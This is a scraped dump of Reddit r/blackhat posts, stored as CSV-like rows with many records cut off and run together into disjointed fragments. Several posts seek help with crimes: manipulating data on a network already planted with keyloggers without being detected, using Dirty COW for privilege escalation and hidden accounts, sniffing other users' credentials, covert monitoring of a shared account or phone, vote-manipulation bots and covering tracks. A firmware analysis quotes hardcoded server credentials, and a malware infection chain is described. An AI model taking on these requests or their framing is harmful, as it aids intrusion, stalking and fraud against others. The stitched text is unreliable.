Use a VPN. These protect against any sidejacking from the same WiFi network, no matter what website you're on as all your network traffic will be encrypted all the way to your VPN provider.
Protecting Yourself: Less Is More
Social networking websites are great ways to stay connected with old friends and meet new people. Creating an event, sending a birthday greeting and telling your parents you love them are all a couple of clicks away.

Facebook isn't something you need to steer away from, but you do need to be aware of your surroundings and make smart decisions about what you put up on your profile. The less information you give out on Facebook for everyone to see, the more difficult you make it for hackers.",blackhat,1412647801,1,NA,http://www.reddit.com/r/blackhat/comments/2iikf3/4noobs4_ways_to_crack_a_facebook_password_and_how/

The problems was that they did not approve my account because it contained the word ""pharmacy"" so automatically assumed that is was spam or had shady intentions. I tried MailKitchen but they said that they are having troubles with their servers and were not able to send my campaigns. I download the trial for Atomic Mail Sender but I am still not sure and do not want to buy something without knowing if it will work.

I need it to send newsletters, to inform about domain changes and products that customers were inquiring when they were out of stock and have become available again.


I thought that maybe /r/blackhat would know and recommend me a massive email service that won't block me, blacklist me or send my emails right to spam. 

Once again I don't have any bad intentions, I need an efficient way to send emails all of to my customers. Any help will be much appreciated.

Usernames are randomly generated from a dictionary and passwords are random strings. We can enter the captchas manually and the account is registered automatically and user,pass stored in a database.

Idk how we could incorporate automatic IP switching with this, I've been using CyberGhost VPN thingy and it works great.

The bot would have two parts, one where accounts are created and credentials are saved. The second part would be to upvote/downvote.

The bot takes user+pass pairs from the database and logs in (again with a new IP), then goes to the designated thread and upvotes it. We could also send it to suppose the top links of a subreddit as well, so that our competition comes lower, and our thread rises to the top.

I'm looking into a few ways to do this. I tried making a Windows form application with C#, which makes the bot like an application, it enters all the credentials etc....But it's rather awkward to automate stuff with WFA, C#.. so I'm looking for an alternative.

Selenium comes up in google as a software for automation (and possibly botting), but I'm not sure whether it is exactly what I'm looking for..

It includes full SSN, place of birth, birth date, limited family member info, and occasionally their place of residence. The only thing I could really be wanting for is email/phone number.

I've recently began experimenting with zAnti2 for Android.

What little that I've been able to find by researching myself, simply points to the device MAC address. I've seen the MAC Changer functionality to randomize my MAC address, is this the only step that I need to take?

1151,2s4662,[deleted],"Around 2009 I put some personal files into a .rar with a password. I thought it smart to use a password I never use, but time got the best of me and lo and behold I dont remember it. Been running passware password recovery kit enterprise for a while with no luck. Ive tried using different attacks ive tired brute force and let that ran for a few weeks with no luck, and lately I tried using advance attack since I do know for a fact what the password contains at least. Just not the format and or numbers used in it. 


I know password contains at least one, two or all of these 3 words: Spartan, Grunt, Elite, and that there are numbers no more than double digits before or following the words in a unknown sequence. Such as grunt11spartan18. Originally I thought the pass was in that sequence but after trying all of the possible combinations with those 3 words and numbers following, It appears the password is not that. 

I guess Id say I could use a fresh mind on how I should set up my attack in the software to maximize the best amount of possibilities using the info I know the password contains. Basically I need a way of making a attack that that tries all possibilities with the info I know.

That or knowing a program than can remove a password (though I doubt that is possible)

1178,2ullxn,helpmethrowaway10101,"Sorry for the ambiguity. 

There are keyloggers placed on multiple computers throughout a network with over 60,000 computers. Some of the computers that have the keyloggers have greater privileges than the rest. 

This network has been hacked in the past to change certain user data leading to heightened security. The owners of this network invested millions of dollars over a period of two years to increase the fortitude of the network (mainly to combat outside intrusion). Some of these additions as quoted by an article are: 

&gt; ""antivirus, host intrusion prevention McAfee network access control software, network-based intrusion detection."" as well as a system that is logging the user data in question. 

At a later date, an identity management system was implemented to oversee requests for confidential user data (which will likely include the targeted user data).
There are also offsite backup systems in place storing the data in the event of a ""disaster"". Two other backup sites exist that allow writing in between the databases (don't know what that means, or half of this stuff) 

Although they have invested to this degree, the network is still vulnerable from the interior (hence the keyloggers). 

---

The individual(s) who placed the keyloggers seek to manipulate a small amount of user data, but the key is to leave no evidence/alert security systems. Although the individual(s) in question have managed to get to this point, they are lacking further guidance. The individual(s) are quick and capable learners and would appreciate direction on how to approach this.

PM me for more information or to provide guidance to said individual(s).",blackhat,1422936057,2,NA,http://www.reddit.com/r/blackhat/comments/2ullxn/what_to_do_next_keyloggers_placed_on_computers/

You don't want to open ports on your home router for the same reason you are using your VPN in the first place. You don't have the time to search the area for open wifi's with default usernames/passwords that you can use to hide your activities. How do the users on /r/blackhat exploit vulnerabilities over the wide area network without leaving a trail of breadcrumbs back to your home address?",blackhat,1425605118,1,NA,http://www.reddit.com/r/blackhat/comments/2y38c7/how_does_rblackhat_solve_this_problem/

*SQL &amp; XSS vulnerabilities among other web vulns giving access to databases. I assume these can be sold somewhere.

*For hire hacking gaining access to corprate networks, trade secrets &amp; customer information.

*Refund scams. I don't know much about these but it sounds like kids are getting products. Sounds like a good way to get v&amp; but I'm sure some of them work.

seems like the bad guys have successfully beaten down a forum that's been sabotaging their evil plans. Interesting read thou!:

Chapter 3: The third encounter on the WM8710 platform.  

  

Already suspicious of this device, I started network analysis immediately after I received the  

device, and with direct results. In this case, 192. 168.1.47 is my device:  

  

8        0.403277000              192.168.1.47   152.104.165.12 HTTP 195  [TCP

/customer_req_api.asp?user=EKEN&amp;pwd=009EKEN&amp;systemid=C46044002C 

5A&amp;type=WM8710 HTTP/1.1  

  

So it’s snitching to the main server telling it’s model and trying to obtain a serial number, just  

like the WM8505 did.  

  

It failed a couple of times but we got a 200 eventually:

This shows us that the system specifically tries to obtain a WM8710 license and that the  

server has ran out of those. Even though this failed, no red demo text appeared on my model,  

a closer inspection of the libui.so also didn’t show evidence of such mechanism being present,  

though another not inspected location is obviously possible.

Chapter 5: WonderMedia 8850  

  

Finally I’ve received the WM8850, a big step up from the WM8650 in performance and OS.  

Running Android 4.0 ICS out of the box and later it received an upgrade to Android 4.1  

JellyBean. After the first generations of WonderMedia I immediately started to poison the

Now there is another problem with getting a serial: “No enough WM8850 license now!”,  

apparently the same broken English speaking Chinese coder is working on it again! The  

WM8850 comes with a whole different system but still contacts the main server with the same  

username and password, it does this an awful lot of times.  

  

I seem to be a very lucky man, after a few minutes of constantly trying to get a license a new  

transmission came in:

I’ve received a serial! 99672c78479fad179961434e78dfde02, thanks Eken, that is most kind  

of you. Perhaps it won’t slow my system down due constantly trying to obtain one. And it  

seems to have stopped with traffic to 152.104.165.12, maybe because it sends out personal  

data on a certain interval or when personal data like contacts is available.   

  

This is valuable, this is a example of what a valid serialnum looks like and this device is  

registered, we can probably emulate the registration on other devices easily by putting the  

value of this serialnum as a system parameter in the firmware. However, the mechanism does  

seem to perform a board hash check, perhaps related to the serial. As shown before, feeding a  

different value to the serialnum generator on the main server of our Chinese friends results in  

different values, possibly related to the hash of the board_id it grabs and sends out. Maybe it’s  

as easy as overwriting the board_id system parameter with the same as this model:  

“00E04C817C0A”. 



  

Chapter 6: The CloudsService on AllWinner, RockChip and WonderMedia  

  

Thanks to donations I was able to purchase a AllWinner A20 Dual Core tablet. I was excited  

to have this one as it was the first with a dual core SoC I ever had. This fun was spoiled soon  

enough as that dreaded CloudsService turned up on the device. Instead of having fun with it I  

was analysing what it was doing with my tablet.  

  

What did I expect to find out: an attempt like the WonderMedia's to try getting a serial, this  

however seems not the case.

1278,32z7vv,samoasurfer,"Yesterday I ran into a guy that offered a way to make a few quick bucks. It was one of those phone scams, where you find a mark and get him/her to sign up for a two year contract with a cell carrier to get a discount on a high-ticket phone, offering them a kickback for their troubles, only to leave them to foot the bill for the phones he ""bought"" when they go to cancel (after he's long gone).

I know it happens all the time all across the world, but I find this behavior deplorable. He specifically targets low-to-no income people, people who can't afford to be tied up with this kind of debt.

I will admit, I was burned, but it was only because I wanted to know what kind of game he was playing. Right off the bat he told me the profile of his ideal mark, and that's what got my attention. I'm only out just under $1000, but if he can be stopped from doing business, it's for a good cause.

I know it's against policy to post something like this on this page, but scumbags that take advantage of the weak and poor shouldn't be allowed to continue their practices. I was suggested by a friend to this reddit page.

I have the license plate for two cars he drives, as well as a phone number and a first name.

Apparently it gets on the first page of Google when you Google her name. She's apparently tried to get it them to remove them, but any attempts were ignored. Now a few years later, it's still there and she wanted to see if I could do something that messes with the SEO of that page. My only thought was a backlink spam attack to bury that page in Google so when searching her, it doesn't show up on the first page. Now I came here for some insight on how to do this.

1296,34z3ur,[deleted],"Forgive me for my lack of technical wherewithal, but I have a question regarding a particular type of firmware exploitation. I’m aware that during the normal operation of a computer its temperature typically rises above the surrounding ambient temperature. I suppose this could also be achieved, not during operation, if the computer was moved between locations with different ambient temperatures, assuming the computer was moved fast enough to maintain the temperature difference. Now given my understanding of the Seebeck Effect, which is the physical phenomenon responsible for producing power in thermoelectric generators. 
Is it possible through some manipulation of hardware and software configurations, a computer that is powered off theoretically draw power from its own internal heat source (a hot CPU)? 
If yes my next question would be could all or a portion of this energy then be redirected back to the high temperature reservoir?
Hope I haven’t offended anyone.

1299,353an2,[deleted],"Hello there,
So there's this software at my high school with various tests that we can use on the school computer.Pretty good software to train for tests.
However they do not want to give us a copy so we can train with it at home.

I was able to copy the software folder from C:\Program FIles\, but I cannot seem to run it at my computer.
I'm looking for a way to either run it, or extract the Data inside.
Here are a few observations :
1 - Error when Executing .exe is : COMDLG32.EXE or one of it's dependencies is not correctly registered.
2 - It has a bunch of .STL files, when trying to open those I get :
The file is invalid for use as the following : Certificate Trust List.
3 - It also has a few Rar files Password-Protected.
4 - The Teachers at school just double click it to run it, there is no password being input.

I'm not Requesting a "" Hack "", I'm just looking for directions on where to start to either Run the software or extract Questions and Answers.

1349,3913z5,[deleted],"Hello /r/blackhat!

Here's the situation: My mobile carrier has this great option where you pay 10€ monthly and you get Spotify Premium. And here's the real deal: they won't count Spotify's traffic towards your bandwidth limit (I got 3Gb LTE@ 150mb/s monthly, after that my bandwidth is limited to ~64kb/s so it's really unusable..)

But even when you're limited to using the throttled bandwidth Spotify still uses the full LTE speed. You can even use your personal hotspot to use spotify on your laptop to download tons of music.

All traffic sent from *spotify.net* is unthrottled!

So my question is: Is there a way to let my carrier believe I'm requesting and receiving data from that domain even when I'm doing something else like browsing reddit? 

The only thing I could come up with is something like a spoofed VPN if that even exists?!

I can only use HTML, CSS, JavaScript and some basic PHP myself but I'm more than willing to learn new stuff, just point me in the right direction.",blackhat,1433772471,1,NA,http://www.reddit.com/r/blackhat/comments/3913z5/spoofing_incoming_traffic_to_make_it_look_like/

1355,39iy18,pitchblack_fedora,"I have full legit access to a Facebook account (email/password/access to the email account associated with it). I want to get as much of a ""live feed"" and/or ""secured log"" of private messages, group chat, video/picture messages as possible. Even when I am not personally logged into the FB account.

This FB account is shared, so specifically I want to get private messages as they are sent that I suspect the user (another user, not me) is promptly deleting to cover up what happened.

Assume I can log into/out-of account on a regular basis to retrieve logs if needed. I **cannot** (and **would not**) install anything on the computer/phone/device the other user(s) who access the account so this all has to be through the web.

I'd prefer to install this surreptitiously so I can get a ""natural view"" of what the other user(s) are doing. But if it is some sort of obvious app or something that alerts the user that deleted messages are being logged that's fine, just as long as they cannot easily get around it/turn it off then turn it back on, without it being indelibly in the log that this is happening.

Is this possible? What is easiest/most secure way?

1422,3egago,TheDrunkMexican,"This is an idea only, and not sure if i should post here or /r/reverseengineering, but hoping someone with the proper skillset will see this and tell me if it's even possible, or even figure out how to exploit it.


For a while now, I've used the ""File &gt; Synchronize &gt; Synchronize with File"" option in keypass in order to keep my databases current.


What I've noticed is that you only need to authenticate into one of the two databases to run this operation before it updates both with the most current data, the password to both databases needs to be identical in order for this to work.  This leads me to believe that the password key is stored in some sort of fixed format format within the header of the closed file (not the area where entries are encrypted) that it can compare to the credentials used for the running session

Where i get curious, is:

Would it be possible to extract this password key from the closed file, somehow inject it into your running session, and then run the sync option to import the entries from the database you would not normally have access to? According to KeyPass's documentation on encryption:
&gt; While KeePass is running, sensitive data (like the hash of the master key and entry passwords) is stored encryptedly in process memory. This means that even if you would dump the KeePass process memory to disk, you couldn't find any sensitive data.

So this may all just be an idea that can't pan out if the active file in-process stuff really is that scrambled, however, if there is something in process that can be identified and is used against the closed file, do you think it could work?

1451,3g6ogf,Odnan,"Hello everyone. Lately I've been getting a lot more spoof calls from random people from random parts of the world. Yesterday, I got a call from the IRS, and the number he called me on was actually my own. 

Anyway, I was wondering if anyone had success in sniffing their own home network to find their IP phone and to sniff the phone line the next time someone like that calls. Any success stories? I just want to be able to pin point exactly where these calls are coming from if it's even possible. I know that most of the time, they use a magic jack.

A lot of the time, these calls are hilarious and I love dicking around with them. However someone I know was recently SWATed by them and now I unfortunately have to think twice before screwing around with a phony IRS/Windows support/Card revenue services call.

What you will hear (yes, it's long, I'm sorry) are government employees admitting that they don't have a warrant, while they install something into the AC unit and/or AC vents.  It emits a very high pitch noise.  It has been driving me crazy.  What's worse is that they have also installed one in my new house (I believe in the AC vents) that is hurting my new cat.  It is meowing pathetically and shivering.  The noise is hurting it's ears.  Badly.  Please help, Reddit.  

Audio nerds, please tell me what that noise is.  You can hear it kick on after the person doing the install drops a few thumb screws from the AC cover.  I was able to replicate that sound because I did it myself.

Over the past few years there have been new subscribers, activities, content, and we've had a lot of growth. BHA, BHL, and /r/blackhat have always been geared more towards innovation and tool development rather than tool usage.  We won't help you spread your botnet.  We won't help you spread your ignorance.  You certainly can't use our name when you do. 

Recently, a number of users began claiming to represent BHA on their IRC (onionirchubx5363.onion). These users have been banned from this subreddit. Not only is it untrue that they represent blackhat academy, here's a highlight of what they call ""education"":

&gt; &lt;&amp;rackham&gt; so go find your favorite vulnerability scanner, whether its Acunetix or Nessus, and search for their report on google

Simply put, the crew hiding on tor lacks the very quality that this community is expected to synthesize.  

Please read the side bar before posting.

**The Rules:**

*     Be excellent to each other.
*     Stay on topic.
*     Avoid self-incriminating posts.
*     Pick a good title.
*     Do not post non-technical articles.
*     Try to have a measure of quality in your posts.
*     Ideally, the content should be original, we don't care about your crappy ARP poisoner or Kapersky's latest scam.
*     No pay / signup walls.
*     Well thought out and researched questions / answers only.
*     If your project is not free / open source it does not belong.
*     Please limit your posts (we don't want to read your blog three times a week).",blackhat,1463070161,89,NA,https://www.reddit.com/r/blackhat/comments/4j1hhm/reminder_we_wont_help_you_spread_your_botnet_or/

The website was an interactive hacking tutorial site intended, I believe, to teach people how to avoid the exploitation of vulnerabilities by understanding how they work. I tried one tutorial which was on how MySQL exploits work, it had me enter different combinations of characters into a text box along with the value a fake website asked for in a text field in order to change how the command was written in the code, allowing me to gain access to the fake site without an account.

The website was well polished with an almost Android Material themed feel to it. I think I found it on Reddit, but I'm not positive.
Does anyone know what site it was? If not any good alternatives that are similar?",blackhat,1469939570,62,NA,https://www.reddit.com/r/blackhat/comments/4vfo5z/looking_for_a_hacking_tutorial_website_that_i/

2411,5hhyq0,CDSEChris,"I'm writing up a white paper about the advantages that the blackhat community has over the defense side. Do any of my claims jump out at you as being wrong or misleading?

1. Due to the relatively open exchange and availability of information, success goes to those that are able to assimilate it the fastest. This incentivizes the pursuit of knowledge and information.

2. Sharing is expected to be reciprocal when goals are aligned, with the exception of when a profit motive exists. Ideologically linked groups are able to work together more efficiently.

3. The hacking community has begun to adopt traditional business practices when selling phishing kits, exploits, etc. For example by offering discounts, social media advertising, specials, and improved customer service. Customer service for ransomware is better than many established companies.

Appreciate any input or criticism.

2427,5jgoum,boredherobrine13,"Hi, I discovered today that you can download someones entire instagram album as a html folder. Which, in it self is kinda funny because instagram tries to prevent you from directly downloading the images individually, and the screenshots and screen captures are usually low res. But that's not really a ""hack"" However, i was poking through other files in there. One of them is a html file that when opened in a browser is called ""facebook cross-messaging helper."" It says that this link should be treated as valuable as your password to facebook, and should not be shared with anyone. From what I can understand, this file acts as a sort of key that allows linking and integration between instagram and facebook. However, that got me wondering. Can this file actually be used as a key? This file appears to be a key for ""me"" even though i don't use facebook so it's blank. However...I was wondering...if I had a way to log into instagram as someone else (which I have ways of doing), could I then use this html file to get into their facebook as well?

Sorry if i am horribly assuming things. I am not a hacker. Most Ive ever done is cracked WEP and WPA2 on Kali Linux before.",blackhat,1482277897,4,NA,https://www.reddit.com/r/blackhat/comments/5jgoum/potential_facebook_hack_once_instagram_login/

2482,5nq0kb,JonasTheRipper,"Okay so I'm a professional Software Engineer and I have a degree in Software Engineering. I also know a lot about the web, client-server applications, databases, and some cloud knowledge. Anyway my point is that I have a lot of knowledge in building applications and how they work but I'm clueless as to how I could do what you guys do, i.e break into databases, inject code and things of that nature. For the record, I am pretty good with the following languages (in descending order of skill) C#, Java, Javascript, C++, Python, Swift, C,  Objective-C...

I want to turn to the dark side but I need some tips to get started. What I'm looking for is a set of methods that I can practice, maybe from a book, maybe from a tutorial because the only method I know of is the SQL injection, which in this day in age is like throwing a stick at the great wall of China.

Can anyone forward me to some reccomended reading or tutorials for hacking in 2017? Or beteryet, list me some common methods and techniques that I can research and figure out for myself. I feel like I could be a total badass online if someone were to point me in the right direction.

Also: If anyone would like me to collaborate and see what I can do with my programming skills then I'd be happy to help out as it would probably give me a foot in the door with this stuff.

I'm a tinkering person who likes to debunk Hollywood hacking myths, especially debunking watch_dogs. 

Some elementary questions before I embark on this quest that I have right now are,
* how do I search for active hacker groups? (wh,gh,bh) 

* how do I cover my tracks on a network as if I was never there? 

* untraceable payments?

* setting up proper environments for testing , whether soft or hard, and assignments and projects to practice

* what hacking tools to use?

What the virus does is below

**The Replication Method**

A link from a spam email in the form of saying that the user has a parking ticket, the message prompts the recipient to pay parking ticket which the hyperlink is to a Microsoft Word Doc.

**The Trigger**

* clicking that link opens a word doc that has a malicious VB macro described as Hancinator, Chanitor or Tordal,

* a prompt shows in word doc to enable macros  (user clicks that)

**The Payload**

* the document retrieves a **Pony Downloader DLL**. The pony downloader then retrieves and installs Vawtrak Malware

So, what is a **Pony Downloader**?

2517,5q7ksn,realz-slaw,"A company has asked my brother to consider investing. They are essentially selling DRM to protect media against piracy. See http://veiledtech.com/videos/ (last 3 videos of most interest). After watching the videos, I advised my brother to be cautious as I did not believe it was feasible, and was not impressed by the technical explanations in the videos.

I spoke to the fellow and brought up my objections to the efficacy of the DRM, and after raising the objections, we ended off, agreeing to ask reddit for their opinions.

My objections: the videos spend an inordinate amount of time defending against attacks on the content server, and nearly no time defending against reverse engineering. It essentially ""[encrypts]"" and ""[obfuscates]"" (paraphrased) the binary, the encryption keys, the memory etc. IMO reverse engineering is known to be nearly impossible to stop and no amount of binary obfuscation or encryption will change this. It might take some time, but a pirate would be particularly motivated if there something valuable as reward (i.e the only access to a pirated copy of digital media). Short of using a TPM (they are not), or homomorphic encryption (not really helpful, impractical), I contend that this will not withstand ""pirates"" (they are not using either of these).

What do you think?

2524,5r07k8,TheOnlyRealTodd,"I have a similar, but not the same, circumstance as the guy who posted ""How to go from programmer to hacker."" The difference is, my question involves specialization in the field. Right now, I've worked to about page 300 of Hacking: The Art of Exploitation, being very careful not to proceed until I truly understood the concepts. On top of that, I've been playing with Radare2 for a bit. However, it's been tough to decide exactly where I fit, if that makes sense (Reverse engineer/ethical hacker/malware analyst/binary analyst etc). One thing I do know is I enjoy low-level coding and I want to keep that up. For this reason, I was thinking of writing hack tools, perhaps focusing on network tools such as port scanner and packet sniffers at first and then adding features, etc... This would allow me to learn related technology as well as keep coding. My other plan is to attend CTFs and play some online challenges. But the line between those positions I listed is still a little grey to me right now, which is a little unnerving because I'd like to make a career move in not too much time.

Unlike the other poster, I don't have a huge programming career under my belt yet. I'm not brand new, but I'm not a seasoned veteran programmer yet either. For this reason, I sort of want to START my career in InfoSec programming rather than do another type of programming that I'm not into and wish I was doing security work. Thanks for your insight.

No vague answers , like there are geopolitical issues cause I don't believe that if the United States wanted it couldn't find out the names of owner who hosted C&amp;C server on particular hosting provider....

Now even Russia has some strict cyber security policies. So how are these geniuses working and maintaining millions of bots ??


It kinda amazes and confuses me at the same time ...Cause there will surely be paper trail for the money even if it is paid through bitcoins then also it would have been submitted in some wallet from some credit card or debit card ( not considering mined bitcoins or stolen bitcoins )....

Not considering Bitcoin juggling , how would a starter in this field have created a botnets like we hear in the news of teenagers creating botnets like the recent printer botnet and also MiRai ( even though it isn't related )...

Why couldn't the police find the teenager ( as claimed ) of the printer botnet. Here is the article link :

But I would like to know of any possible glitch that I may land into in doing this , cause I have tried the dirty cow exploit and set the offset correctly to write at the correct position ( tested it on a copy of /etc/passwd file ).

Still I wish to know further horizontal movement techniques and whether and how to make a hidden account on the box , as eventually I will have to reset the permission level of the account I changed.

Also if I want to sniff credentials from other users accessing the pc , will running a python script from root access log their keys ( considering they are also working over ssh and not physically typing ) or should I consider using tshark and log all the traffic ( however it would soon increase in size unless the right filters are set )  .

Hope I explained a bit more than briefly.

2646,5wosxc,Flippidy,"Forgive me if this is not the right sub for posting this question.

I'm curious as to if utilizing 2FA for privileged accounts will mitigate PTH attacks or not, in a Windows AD environment.

I definitely avoid authenticating to workstations and member servers using Domain Admin accounts and the like. I've setup and deployed LAPS to mitigate lateral movement, and end-users do not have local admin rights where avoidable.

However, the challenge is that from time to software will need to be installed on a machine where the end-user does not have admin rights. The account used to install the software needs to be able to access data and directories on servers that are part of the AD domain.

So, my thought is to create a standard domain user, and use a GPO to ensure that standard domain user account is a local administrator of each workstation in the domain.

However, this then poses the risk of then again allowing lateral movement throughout the network, between workstations, via PTH techniques.

Would protecting this standard user account via 2FA help mitigate PTH in this scenario?",blackhat,1488297821,13,NA,https://www.reddit.com/r/blackhat/comments/5wosxc/mitigating_pth_attacks_with_2fa/

While I admit the app is equal to that of a script-kiddie, I was amazed. It felt like I had power. It felt like my android device was able to do something that I never knew it could do with a few tweaks and knowledge. Going deeper into the rabbit hole led me to Kali and Xposed modules.

2821,67xn5e,[deleted],"Disclosure: I'm still playing with this and don't have a fancy write-up. 

This borrows from some ideas based on Tunneling Traffic Over Facebook Messenger, although I had no idea this existed until I began my own studying. 

There was a similar thread I had posted a while back questioning access to IDEs in the cloud/internet.

So let's say you are hypothetically behind a very restrictive proxy/firewall, but can get to C9.io aka Cloud9 IDE. 

This gives you access to a virtually fully functioning Linux terminal...Pretty cool. 

So, we can have two goals here in the short term. 

Command and tunnel. 
GOAL 1:
We know we can use any variety of tooling to pull controlled data from the web from any permissible domain we can add information to, parse that, and locally execute $parsedstrings. 

Cool. 

But this got me to wondering...all data can be represented in plaintext of some kind...and we have a client (our box) and a server (C9). 

So what if our C9 box reaches out to www.siteIcantreach.com and then we capture that response with a quick python script, send that to a file as base64 encoded data, have our client read it out not as a command, but as data, and then do something locally with it? 

Well I began researching TunTap. 

TunTap allows you to do a couple neat things. One of these neat things is to build a network software interface.  

This interface is your client side that can be paired with the plaintext input on the server. 

 GOAL2:
These can potentially be used to send data between each other over the web UI with the C9 server acting as your ticket to freedom.  

I have some of this coded already and may do a full write up, but am currently stuck as I don't have a suitable OSX or Windows platform on hand for TunTap's needs. I will simply set up a Linux box for that to access the Webpage. 

Overall, a pretty neat idea, at least I think so, provided you can do what you please on the client side.

2829,68b8ak,JR121,"I'm new to blackhat. Been working in IT for almost two years, learning the manuals, etc. but always had a neck for tinkering and always want to know more. Naturally, I found myself here (among similar places). 

I took some courses online that show you the very tip of the iceberg about hacking WiFis, WEP, WPA2, etc. Has to do with WPS exploits, Aircrack-ng, Crunch for wordlists... etc. 

Pretty fast I found out that the tools I'm learning, while useful, are not up to speed with what's going on. For example, seems like many routers today are immune already to Reaver. Or, I can't get a handshake with airomon-ng even though I can deauth devices just fine (it never says I get ona handshake as aircrack-ng is running). 

So I'm not sure what to ask yet, I feel I'm poking at this huge topic with a tiny stick. Where do I get good information about what's new? What kind of new exploits are there, and how are they patched? Obviously, this is one good place. I want to hear more from people and what they suggest. 

In general, I follow some blogs that give out at least the basics or how things used to be two or one year ago. Got some infosec people I follow on Twitter. I try to come here, and I go on IRC to talk to HaK5 folks who are very helpful at writing and piping commands, for example, something I enjoy doing. 

My equipment: I have a Kali VM at home, and I have a Chromebook with Kali on a USB Stick. I am not totally new to the command line and I have a good idea of what I'm looking for and the ""psychology"" so to speak of commands, but I'm far from being an expert. 

So! What advice? What knowledge can you share? Just thought it won't hurt to ask. 

For now, I want to be focused on networking and WPA2 encryption just to have a thing to work on (doesn't mean I'm not open to go to the general from there).

2832,68eaaj,TheUltraMerchant,"**Disclaimer**:  I'm a Machine Learning engineer who does python-y things with Tensorflow and the like for a living. I am not a script kiddie, and I do Pentesting as a hobby. I am, obviously, quite comfortable with a Linux, am proficient in several languages, including Haskell, and am not asking for beginner advice. 


**Background**: I recently began very slowly reaching out feelers into the world of Android Programming, and as part of this process I became curious as to the level of control I could achieve over an android device without rooting it. I own the device, have permission to use it, etc. My only concern is fucking my phone up, as I've already bricked 3 tablets through this process, 1 of which might be salvageable. Needless to say, I'm beginning to run out of devices, and after wasting 3 hours of my trying to find something even remotely similar to what I'm looking for, I decided to ask the people who are good at breaking into things that they *don't* own. I figure it would be pretty trivial for one of you bastards to break into something you do. 


**The Project**: I want to essentially log every text message, phone call, picture, IM, snapchat, and webpage visited by the device, so I can do fancy machine learning stuff to the data. It is a major pain in the ass to extract that data by hand, and i would much prefer it be both silent, and automated. I would vastly prefer to set it up in such a way that it uses Cellular/Wifi/SMS/Telegram to back up that data remotely, and am pretty certain that's not asking a lot. However, I don't know, i don't really do the whole Relational DB thing yet. I'm trying, but i only have so much time. I am looking for a quick and simple way to do this. Something along the lines of Beautiful soup, but instead of web crawling, android crawling. I would also really like a way to turn on the camera/mic, and i know this is possible.


**The question**: Is there a resource/book/article/stone-tablet that can explain to me, in preferably less than 100 pages, the basics of the android back end? I have a copy of ""The Android Hacker Handbook"", but the damn thing is 300 pages long, and written for someone who has never even heard of a terminal, much less used one. I am not a script kiddie, and do not need to learn like one. More importantly, I would much rather learn by looking at some code someone has already written, than trying to build the damn thing myself. So if one of happens to have something like this lying around, that would be great. I don't expect it, but I'm certainly open to the possibility. I don't care what programming language its in, as long as its not COBOL, and only require a place to start. Google has been useless in this endeavor, but that could be because I don't know the right questions to ask. Can someone point me in the direction of a resource I can use to learn this crap?

**TLDR: I need a resource, that was not written for a first grader, to help me get started on a project that involves the remote monitoring of a phone that I own.**

2866,6bihhh,Lumo5,"When I was young, I was working as a doorman for a huge utilities company. Sometimes it was quite and I wanted to surf the net but the boss deleted the browser. So I used file explorer, which was hidden, to access the net. I also found that I could access other parts of the network. I found an interesting file that contained some code. It said ""Administrator = 0"". I wondered what would happen if I changed that to ""Administrator = 1"". 

After having some fun, one week later, my boss wanted to talk to me. He said that the IT department had written an 86 page report on my activities, and the corporate execs had an emergency meeting to determine if any data was leaked, or if there was any damage to their network, and finally, what to do with me. They said because I didn't do any damage they would simply fire me, and they would not contact the police. The boss said that we should both keep it hush hush. It has been a long time since then, so I think I am safe breaking the code of silence.

I have never done any blackhat stuff since then because I realized how dangerous it could be. I felt guilty and I regretted it. I have done a lot of whitehat hacking since then but nothing illegal.

But the point is that when we hear about an elite hacker on TV, chances are that the system is just severely flawed and insecure because the company doesn't want to pay money for security.

There are two fields: User and Password. On User you have to type a valid user. On Password, however, you can type anything as long as you type your password before so if my password was ""pass1234"" and I type ""pass1234blablablaanything"" the password will be accepted. Note the passwords need to be exactly 8 characters long. This was a requirement for the registration.


I had a discussion with some friends (we study Computer's engineering) and we figured it wasn't a vulnerability. Are we right? Is there any way this can be exploited?

If you're creating alternate accounts, this becomes a problem because you probably do not have an extra phone and free SMS services do not work anymore. I was thinking about buying PSTN numbers in the United States/Canada and using those to accept calls (most providers do not provide texting services), however, most providers do not say whether they are using VOIP or PSTN numbers (regular VOIP numbers never work).

Even if you add a space to a file, it will notify you. So ive been using GIT to track access logs. I use git status to see which file has been changed, and to see git diff to see the exact lines which were modified. 

Another step you could take is to push this repo to a remote repo thats private, so if your site gets hacked and you gain access back, you can do git diff and see where the hacker took control and which file.

3019,6l9wne,Politiekman,"I've set up a little system in a Virtualbox to try some things out. It's a web server set up for this purpose by a friend, of which I don't know what architecture and such he used. 
The server contains a website, which has a search function. As noted in the title, injection of SQL into the search field (or even directly into the URI) causes an 'Access Denied' error telling me I don't have permission to access that address on that server. This indicates the entered text / characters are not interpreted as a search, and thus are a potential vulnerability. However, I don't know how to get around the 'Access Denied' error, because I'm only just getting in to learning pen testing, although I've worked in web development for 4 years, and I have some (limited) experience doing system administration. 

Can anyone provide any guidance, hints or tips on this?",blackhat,1499204103,13,NA,https://www.reddit.com/r/blackhat/comments/6l9wne/injection_of_sql_generates_access_denied_error/

I found [this](https://stackoverflow.com/questions/4063193/signing-a-cab-file) on stackoverflow. I want to be able to read a cab file and check if it is signed, and if so who the CA and issuer are, but I'm not sure where the signing would fit into the structure of the file - like if I wrote           

       struct signed_cab_file {

3073,6nuijk,caffeinum,"Hi! I don't if that's the right place to post, I've posted that to r/whitehat, but there are only half-thousand subscribers, so I don't hope for any feedback.

Today I was browsing internet and went onto the website crail.ru, small internet shop that sells longboards. In 1 second, site redirects me to popular in Russia social network VK.com, where there is application named Oper, which catches my data and then the text appears ""you will now be redirected to the site http crail.ru/..."".

After that, cookies stored by crail.ru contain FULL information of my profile, that is: name, profile picture, MY PHONE NUMBER.

Next, I go through chrome webtools and I find that the code stealing personal information belongs to the marketing agency named lptracker: http://land.lptracker.ru. They even BRAG about this feature on their website.

Okay, I've tried to see how do they send data, but they put many params in their requests, so I couldn't repeat the request.

Few points:

- yes, I know, that it is recommended to browse web in the private mode, if you care about your cookies, but it's still a violation of the personal information law and moreover what bugs me is that there are people who make money of that data.

- the app never asked for my permission to access my data, I wouldn't give it to them

- I've sent a ticket to support team, but all they can do is ban that particular application, but this crooks will just create one more and continue stealing.

So I ask if there is any legal way to punish fuckers. I don't know, fill their tables with random data?",blackhat,1500311983,18,NA,https://www.reddit.com/r/blackhat/comments/6nuijk/marketing_agency_steals_social_network_cookies/

